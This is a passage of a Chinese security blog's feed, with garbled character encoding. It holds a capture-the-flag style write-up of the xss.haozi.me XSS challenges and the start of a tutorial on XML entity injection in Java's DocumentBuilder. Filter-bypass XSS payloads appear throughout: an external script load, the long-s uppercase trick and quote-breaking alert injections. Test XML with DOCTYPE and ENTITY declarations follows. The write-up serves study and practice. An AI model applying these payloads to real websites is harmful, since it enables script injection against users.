class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">scriscriptpt</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤äº†&lt;ã€/ã€â€ã€â€™ç­‰å­—ç¬¦ä¸ºç©ºï¼Œå†å°†è¾“å…¥ä¼ å…¥scriptæ ‡ç­¾ä¸­æœ‰æ³¨é‡Šç¬¦çš„alert()å†…ã€‚</p><p>å…ˆé€šè¿‡æ¢è¡Œç»•è¿‡æ³¨é‡Šç¬¦é™åˆ¶ï¼Œç”¨åå¼•å·`æ›¿æ¢()ï¼Œæœ€åæ¢è¡Œæ·»åŠ HTMLæ³¨é‡Š â€“&gt; æ¥æ³¨é‡Šæ‰åé¢çš„jsä»£ç ï¼ˆè®°ä½ï¼Œåœ¨â€“&gt;å‰å¿…é¡»æ·»åŠ æ¢è¡Œæ‰ä¼šç”Ÿæ•ˆï¼‰ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">alert`1`;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="0x0E"><a href="#0x0E" class="headerlink" title="0x0E"></a>0x0E</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/&lt;([a-zA-Z])/g</span>, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;h1&gt;'</span> + input + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤äº†ä»¥â€&lt;â€å¼€å¤´ä¸”ç´§æ¥å­—æ¯çš„å­—ç¬¦ä¸²ï¼Œå°†å…¶åœ¨â€&lt;â€ä¸å­—æ¯ä¸­é—´æ·»åŠ ä¸‹åˆ’çº¿â€_â€ã€‚</p><p>è¿™é¢˜éœ€è¦è§£å†³ä¸¤ä¸ªé—®é¢˜ï¼š1. \&lt;sè¢«æ­£åˆ™æ›¿æ¢åäº†ï¼› 2. å¤§å†™çš„jsæ— æ³•æ­£å¸¸è¿è¡Œã€‚</p><p>è¿™ä¸ªç¡®å®ä¸ä¼šæï¼Œåˆ°ç½‘ä¸Šçœ‹äº†ä¸‹wpï¼Œå‘ç°è¿˜æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼šâ€œÅ¿ å¤è‹±è¯­ä¸­çš„sçš„å†™æ³•, è½¬æˆå¤§å†™æ˜¯æ­£å¸¸çš„Sâ€ã€‚</p><p>é‚£å°±ç›´æ¥å°†ä¹‹å‰payloadçš„sæ›¿æ¢æˆ Å¿ å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Å¿cript</span> <span class="attr">src</span>=<span class="string">"https://xss.haozi.me/j.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x0F"><a href="#0x0F" class="headerlink" title="0x0F"></a>0x0F</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™å¯¹å•åŒå¼•å·ã€&amp;ã€&lt;&gt;ã€/è¿›è¡Œäº†HTMLå®ä½“ç¼–ç ï¼Œå†æ”¾ç½®åˆ°imgæ ‡ç­¾çš„onerrorå±æ€§ä¸­ã€‚</p><p>ä½†æ˜¯ï¼Œå¯¹HTML inline jsè½¬ä¹‰å°±æ˜¯åšæ— ç”¨åŠŸï¼Œæµè§ˆå™¨ä¼šå…ˆè§£æHTMLï¼Œç„¶åå†è§£æjsã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥é—­åˆå‰é¢çš„console.error()ï¼Œæ·»åŠ ;åˆ†å·å†æ³¨å…¥alertè¯­å¥å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">');alert('1</span><br><span class="line">æˆ–</span><br><span class="line">');alert(1)</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h2 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†è¾“å…¥æ”¾ç½®åˆ°scriptæ ‡ç­¾çš„window.dataä¸­ã€‚</p><p>å¯ä»¥åœ¨å‰é¢é€šè¿‡å¼•å·éšæ„èµ‹å€¼ç»™window.dataï¼Œä»¥åˆ†å·ç»“æŸè¯¥jsè¯­å¥ï¼Œå†æ³¨å…¥alertè¯­å¥å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"";alert(1)</span><br></pre></td></tr></table></figure><p>å¯ä»¥é—­åˆæ‰scriptæ ‡ç­¾ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥ç›´æ¥åœ¨window.dataæ‰§è¡Œå†èµ‹å€¼ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alert(1)</span><br><span class="line">æˆ–</span><br><span class="line">eval(alert(1))</span><br><span class="line">æˆ–</span><br><span class="line">eval("alert(1)")</span><br></pre></td></tr></table></figure><h2 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆé•¿çš„ä¸€æ®µè¿‡æ»¤ï¼Œå°†åæ–œæ \ã€å•åŒå¼•å·ã€&lt;&gt;ã€åå¼•å·`ã€æ–œæ /ã€æ¢è¡Œç¬¦\nä¸\rã€tabç¬¦\tã€æ¢é¡µç¬¦\fã€å‚ç›´åˆ¶è¡¨ç¬¦\vã€ç©ºå­—ç¬¦\Oéƒ½åœ¨å…¶å‰é¢æ·»åŠ åæ–œæ \è¿›è¡Œè½¬ä¹‰ï¼Œæœ€åå†æ”¾ç½®åˆ°scriptæ ‡ç­¾ä¸­ã€‚</p><p>è¿™é‡Œæ³¨æ„åˆ°<code>console.log(&quot;${s}&quot;)</code>ï¼Œå½“æˆ‘ä»¬è¾“å…¥åŒå¼•å·æ—¶ï¼Œå…¶å®æ˜¯è¾“å…¥\â€œï¼Œç„¶ååˆšåˆšçš„ä»£ç å°±å˜æˆ<code>console.log(&quot;\&quot;&quot;)</code>ï¼Œè¿™æ ·è¾“å…¥çš„\â€œå‰é¢çš„åæ–œæ \ç›´æ¥æ”¾åœ¨åŒå¼•å·ä¸­è¢«å¿½ç•¥æ‰äº†ï¼Œèµ·ä¸åˆ°è½¬ä¹‰å­—ç¬¦çš„ä½œç”¨ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨æ­¤ç›´æ¥æ„é€ ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">");alert("1</span><br><span class="line">æˆ–</span><br><span class="line">");alert(1)//</span><br><span class="line">æˆ–</span><br><span class="line">");alert(1);<span class="comment">&lt;!--</span></span><br></pre></td></tr></table></figure><p>ä¸­é—´çš„payloadè™½ç„¶//è¢«è½¬ä¹‰ä¸ºäº†\/\/ï¼Œä½†è½¬ä¹‰ä¹‹åè¿˜æ˜¯//ï¼Œä¸å½±å“æ³¨é‡Šæ•ˆæœã€‚</p><h2 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h2><p>å…³é”®æºç ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­£åˆ™è¿‡æ»¤äº†åŒå¼•å·ï¼Œå°†å…¶æ›¿æ¢ä¸º\\â€œï¼Œå†å°†è¾“å…¥æ”¾ç½®åˆ°scriptæ ‡çš„console.log()ä¸­ã€‚</p><p>æµ‹è¯•ä¸€ä¸‹å‘ç°ï¼Œå½“æˆ‘ä»¬è¾“å…¥\â€œæ—¶ï¼Œç»è¿‡è½¬ä¹‰åä¸º<code>console.log(&quot;\\&quot;&quot;)</code>ï¼Œå³å°†è¿‡æ»¤æ—¶æ·»åŠ çš„è½¬ç§»ç¬¦ç»™è½¬ä¹‰äº†ï¼Œä»è€Œç»•è¿‡äº†è½¬ç§»ç¬¦çš„è½¬ä¹‰åŠŸèƒ½ï¼Œå¯æ„é€ å¦‚ä¸‹payloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\");alert(1)//</span><br><span class="line">æˆ–</span><br><span class="line">\");alert(1)</span><br><span class="line">--&gt;</span><br><span class="line">æˆ–</span><br><span class="line">\");alert(1)<span class="comment">&lt;!--</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ï¼Œç”±äºè§£æHTMLæ ‡ç­¾çš„ä¼˜å…ˆçº§é«˜äºè§£æJSçš„ä¼˜å…ˆçº§ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç›´æ¥é—­åˆæ ‡ç­¾ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="number">1</span>)<span class="comment">//</span></span></span><br></pre></td></tr></table></figure><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™æ¬¡çš„ç»ƒä¹ å¤šæ˜¯é’ˆå¯¹æ­£åˆ™çš„ç»•è¿‡ï¼Œå­¦åˆ°ä¸€äº›æ–°å§¿åŠ¿ï¼Œæ¨èç»ƒä¹ ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h2&gt;&lt;p&gt;è¿™é‡Œå†™ä¸‹haoziå¤§ä½¬çš„XSSé—¯å…³ç»ƒä¹ ç¬”è®°ã€‚&lt;/p&gt;
&lt;p&gt;é¢˜ç›®ç½‘å€ä¸ºï¼š&lt;a href=&quot;https://xss.haozi.me/&quot; ta
      
    
    </summary>
    
      <category term="WriteUp:Web" scheme="https://Mi1k7ea.github.com/categories/WriteUp-Web/"/>
    
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
      <category term="Webå®‰å…¨" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>XMLæ³¨å…¥ä¹‹DocumentBuilder</title>
    <link href="https://Mi1k7ea.github.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/"/>
    <id>https://Mi1k7ea.github.com/2019/02/13/XMLæ³¨å…¥ä¹‹DocumentBuilder/</id>
    <published>2019-02-13T14:19:12.000Z</published>
    <updated>2019-02-14T13:52:58.717Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ä½•ä¸ºDocumentBuilder"><a href="#ä½•ä¸ºDocumentBuilder" class="headerlink" title="ä½•ä¸ºDocumentBuilder"></a>ä½•ä¸ºDocumentBuilder</h2><p>DocumentBuilderæ˜¯Javaä¸­å¸¸ç”¨çš„XMLæ–‡æ¡£è§£æå·¥å…·ï¼Œæ˜¯åŸºäº DOMï¼ˆDocument Object Modelï¼Œæ–‡æ¡£å¯¹è±¡æ¨¡å‹ï¼‰çš„è§£ææ–¹å¼ï¼ŒæŠŠæ•´ä¸ªXMLæ–‡æ¡£åŠ è½½åˆ°å†…å­˜å¹¶è½¬åŒ–æˆDOMæ ‘ï¼Œå› æ­¤åº”ç”¨ç¨‹åºå¯ä»¥éšæœºè®¿é—®DOMæ ‘çš„ä»»ä½•æ•°æ®ã€‚å› æ­¤å…¶ä¼˜ç‚¹æ˜¯çµæ´»æ€§å¼ºã€é€Ÿåº¦å¿«ï¼› ç¼ºç‚¹æ˜¯æ¶ˆè€—èµ„æºæ¯”è¾ƒå¤šã€‚</p><h2 id="å¸¸è§„ç”¨æ³•Demo"><a href="#å¸¸è§„ç”¨æ³•Demo" class="headerlink" title="å¸¸è§„ç”¨æ³•Demo"></a>å¸¸è§„ç”¨æ³•Demo</h2><p>å…ˆå®šä¹‰ä¸€ä¸ªuser.xmlï¼Œç”¨äºè®©DocumentBuilderæ¥è§£æï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Mi1k7ea<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sex</span>&gt;</span>male<span class="tag">&lt;/<span class="name">sex</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">age</span>&gt;</span>20<span class="tag">&lt;/<span class="name">age</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è§£æä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"user.xml"</span>);</span><br><span class="line">        documentBuilder(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">documentBuilder</span><span class="params">(File f)</span></span>&#123;</span><br><span class="line">        DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            DocumentBuilder builder=factory.newDocumentBuilder();</span><br><span class="line">            <span class="comment">//è§£æxmlæ–‡æ¡£ï¼Œå…ˆè·å–</span></span><br><span class="line">            Document doc=builder.parse(f);</span><br><span class="line">            <span class="comment">//é€šè¿‡useråå­—æ¥è·å–domèŠ‚ç‚¹</span></span><br><span class="line">            NodeList nodeList=doc.getElementsByTagName(<span class="string">"user"</span>);</span><br><span class="line">            Element e=(Element)nodeList.item(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">//è·å–å€¼</span></span><br><span class="line">            System.out.println(<span class="string">"å§“åï¼š"</span>+e.getElementsByTagName(<span class="string">"name"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"æ€§åˆ«ï¼š"</span>+e.getElementsByTagName(<span class="string">"sex"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">            System.out.println(<span class="string">"å¹´é¾„ï¼š"</span>+e.getElementsByTagName(<span class="string">"age"</span>).item(<span class="number">0</span>).getFirstChild().getNodeValue());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œåï¼Œå‘ç°æˆåŠŸè§£æäº†user.xmlçš„å†…å®¹ï¼š</p><p><img src="/2019/02/13/XMLæ³¨å…¥ä¹‹DocumentBuilder/1.png" alt="demo"></p><h2 id="XMLæ³¨å…¥"><a href="#XMLæ³¨å…¥" class="headerlink" title="XMLæ³¨å…¥"></a>XMLæ³¨å…¥</h2><h3 id="1ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æDTDï¼š"><a href="#1ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æDTDï¼š" class="headerlink" title="1ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æDTDï¼š"></a>1ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æDTDï¼š</h3><p>åˆ›å»ºtest.xmlï¼Œå†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦æ·»åŠ äº†DTDå³DOCTYPEï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç ä¸­å°†user.xmlæ”¹ä¸ºtest.xmlã€‚</p><p>è¿è¡Œä»£ç ï¼Œæ•ˆæœå’ŒDemoä¸€æ ·ï¼Œå³è¯´æ˜æ”¯æŒè§£æDTDã€‚</p><p>è¿™é‡Œæ³¨æ„ä¸€ç‚¹ï¼Œå½“è¿›è¡Œçš„æ˜¯é»‘ç›’æµ‹è¯•æ—¶ï¼Œæœªè¿”å›Errorä¸ä»£è¡¨å°±æ˜¯å¯ä»¥è§£æXMLï¼Œä½†è¿”å›Errorå°±è‚¯å®šæ˜¯ä¸æ”¯æŒè§£æè¯¥XMLï¼ŒåŸå› æ˜¯æœåŠ¡ç«¯å¯èƒ½å¯¹Errorè¿›è¡Œäº†å°è£…ã€‚</p><h3 id="2ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£ææ™®é€šå®ä½“ï¼š"><a href="#2ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£ææ™®é€šå®ä½“ï¼š" class="headerlink" title="2ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£ææ™®é€šå®ä½“ï¼š"></a>2ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£ææ™®é€šå®ä½“ï¼š</h3><p>ä¿®æ”¹test.xmlå†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦æ·»åŠ ELEMENTï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ELEMENT foo EMPTY&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;male&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>å‘ç°å¯ä»¥æ­£å¸¸è§£æã€‚</p><h3 id="3ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æå‚æ•°å®ä½“ï¼š"><a href="#3ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æå‚æ•°å®ä½“ï¼š" class="headerlink" title="3ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æå‚æ•°å®ä½“ï¼š"></a>3ã€æµ‹è¯•æ˜¯å¦æ”¯æŒè§£æå‚æ•°å®ä½“ï¼š</h3><p>ä¿®æ”¹test.xmlå†…å®¹å¦‚ä¸‹ï¼Œä¸»è¦ä¿®æ”¹ELEMENTä¸ºENTITYå®ä½“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">        &lt;!ENTITY foo &quot;Entity can be hacked&quot;&gt;</span><br><span class="line">        ]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">    &lt;name&gt;Mi1k7ea&lt;/name&gt;</span><br><span class="line">    &lt;sex&gt;&amp;foo;&lt;/sex&gt;</span><br><span class="line">    &lt;age&gt;20&lt;/age&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä»£ç ï¼Œå‘ç°å¯æ­£å¸¸è§£æï¼Œä¸”æˆåŠŸè¿›è¡Œäº†XMLå®ä½“æ³¨å…¥ï¼š</p><p><img src="/2019/02/13/XMLæ³¨å…¥ä¹‹DocumentBuilder/2.png" alt="demo"></p><h3 